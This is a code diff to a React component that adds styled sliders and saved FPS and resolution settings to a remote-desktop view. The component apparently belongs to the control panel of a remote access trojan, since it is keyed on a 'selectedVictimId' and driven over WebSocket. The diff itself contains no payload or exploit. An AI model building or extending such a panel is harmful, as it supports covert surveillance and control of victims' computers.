@@ -7,6 +7,64 @@ import { usePanelDetailView } from "../panel-detail-view-provider";
 import { usePanelWS } from "../../../ws/ws-provider";
 import { bindRemoteDesktopActions } from "./remote-desktop/bind-remote-desktop-actions";
 
+const SLIDER_CSS = `
+   .rd-slider {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 120px;
+      height: 4px;
+      border-radius: 999px;
+      background: rgba(255,255,255,0.15);
+      outline: none;
+      cursor: pointer;
+   }
+   .rd-slider::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background: #d4a843;
+      border: 2px solid rgba(255,255,255,0.9);
+      cursor: pointer;
+      box-shadow: 0 0 8px rgba(212,168,67,0.6);
+   }
+   .rd-slider::-moz-range-thumb {
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background: #d4a843;
+      border: 2px solid rgba(255,255,255,0.9);
+      cursor: pointer;
+      box-shadow: 0 0 8px rgba(212,168,67,0.6);
+   }
+   .rd-slider::-webkit-slider-runnable-track {
+      height: 4px;
+      border-radius: 999px;
+      background: linear-gradient(90deg, #d4a843, rgba(255,255,255,0.15));
+   }
+   .rd-slider::-moz-range-track {
+      height: 4px;
+      border-radius: 999px;
+      background: linear-gradient(90deg, #d4a843, rgba(255,255,255,0.15));
+   }
+`;
+
+function readLocal(key: string, fallback: number): number {
+   try {
+      const v = localStorage.getItem(key);
+      if (v !== null) {
+         const n = parseInt(v, 10);
+         if (!isNaN(n)) return n;
+      }
+   } catch { }
+   return fallback;
+}
+
+function writeLocal(key: string, val: number) {
+   try { localStorage.setItem(key, String(val)); } catch { }
+}
+
 export function RemoteDesktopSection() {
    const detail = usePanelDetailView();
    const ws = usePanelWS();
@@ -20,8 +78,40 @@ export function RemoteDesktopSection() {
       });
    }, [detail.selectedVictimId, qc, ws]);
 
+   useEffect(() => {
+      const fpsSlider = document.getElementById("remoteDesktopFps") as HTMLInputElement | null;
+      const fpsValue = document.getElementById("remoteDesktopFpsValue");
+      const resSlider = document.getElementById("remoteDesktopResolution") as HTMLInputElement | null;
+      const resValue = document.getElementById("remoteDesktopResolutionValue");
+
+      if (fpsSlider) {
+         const saved = readLocal("rd_fps", 30);
+         fpsSlider.value = String(saved);
+         if (fpsValue) fpsValue.textContent = String(saved);
+         const onFps = () => {
+            const v = parseInt(fpsSlider.value, 10);
+            if (fpsValue) fpsValue.textContent = String(v);
+            writeLocal("rd_fps", v);
+         };
+         fpsSlider.addEventListener("input", onFps);
+      }
+
+      if (resSlider) {
+         const saved = readLocal("rd_resolution", 75);
+         resSlider.value = String(saved);
+         if (resValue) resValue.textContent = String(saved);
+         const onRes = () => {
+            const v = parseInt(resSlider.value, 10);
+            if (resValue) resValue.textContent = String(v);
+            writeLocal("rd_resolution", v);
+         };
+         resSlider.addEventListener("input", onRes);
+      }
+   }, []);
+
    return (
       <div className="detail-section h-full">
+         <style>{SLIDER_CSS}</style>
          <div className="relative h-full w-full">
             <div id="remoteDesktopInner" className="relative h-full w-full bg-[#111]">
                <div
@@ -40,9 +130,16 @@ export function RemoteDesktopSection() {
                      <div className="flex flex-1 items-center justify-center gap-[18px]">
                         <div className="inline-flex items-center gap-[8px] text-[13px] text-[#e0e0e0]">
                            <span className="font-semibold">FPS</span>
-                           <input id="remoteDesktopFps" className="w-[120px]" type="range" min={1} max={60} defaultValue={30} />
+                           <input
+                              id="remoteDesktopFps"
+                              className="rd-slider"
+                              type="range"
+                              min={1}
+                              max={60}
+                              defaultValue={readLocal("rd_fps", 30)}
+                           />
                            <span id="remoteDesktopFpsValue" className="min-w-[26px] text-right font-bold">
-                              30
+                              {readLocal("rd_fps", 30)}
                            </span>
                         </div>
 
@@ -50,14 +147,14 @@ export function RemoteDesktopSection() {
                            <span className="font-semibold">Resolution %</span>
                            <input
                               id="remoteDesktopResolution"
-                              className="w-[120px]"
+                              className="rd-slider"
                               type="range"
                               min={10}
                               max={100}
-                              defaultValue={75}
+                              defaultValue={readLocal("rd_resolution", 75)}
                            />
                            <span id="remoteDesktopResolutionValue" className="min-w-[26px] text-right font-bold">
-                              75
+                              {readLocal("rd_resolution", 75)}
                            </span>
                         </div>
                      </div>
@@ -66,7 +163,7 @@ export function RemoteDesktopSection() {
                            id="remoteDesktopStartBtn"
                            type="button"
                            className={
-                              "min-w-[120px] rounded-[12px] border border-white/[0.18] bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] " +
+                              "min-w-[120px] cursor-pointer rounded-[12px] border border-white/[0.18] bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] " +
                               "shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,border-bottom-color,color,transform,box-shadow] duration-[120ms] " +
                               "hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:text-white hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                            }
